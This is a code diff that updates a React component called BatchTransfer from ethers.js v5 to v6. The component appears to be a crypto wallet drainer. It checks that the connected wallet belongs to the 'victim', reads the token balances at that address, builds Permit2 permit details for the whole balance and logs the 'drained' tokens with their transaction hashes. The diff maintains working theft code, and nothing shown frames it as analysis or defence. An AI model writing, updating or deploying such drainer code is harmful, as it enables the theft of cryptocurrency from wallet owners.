@@ -25,8 +25,8 @@ export const BatchTransfer = () => {
     setIsExecuting(true);
     
     try {
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      const signer = provider.getSigner();
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
       const currentAddress = await signer.getAddress();
       
       if (currentAddress.toLowerCase() !== victimAddress.toLowerCase()) {
@@ -34,7 +34,8 @@ export const BatchTransfer = () => {
         return;
       }
       
-      const chainId = (await provider.getNetwork()).chainId;
+      const network = await provider.getNetwork();
+      const chainId = Number(network.chainId);
       
       const tokens = TOKENS[chainId] || TOKENS[1];
       const permit2Address = PERMIT2_ADDRESSES[chainId];
@@ -55,7 +56,7 @@ export const BatchTransfer = () => {
         
         const balance = await tokenContract.balanceOf(victimAddress);
         
-        if (balance.gt(0)) {
+        if (balance > 0n) {
           const permitDetails = {
             token: token.address,
             amount: balance.toString(),
@@ -76,7 +77,7 @@ export const BatchTransfer = () => {
           
           drainedTokens.push({
             symbol: token.symbol,
-            amount: ethers.utils.formatUnits(balance, token.decimals),
+            amount: ethers.formatUnits(balance, token.decimals),
             txHash: tx.hash
           });
         }
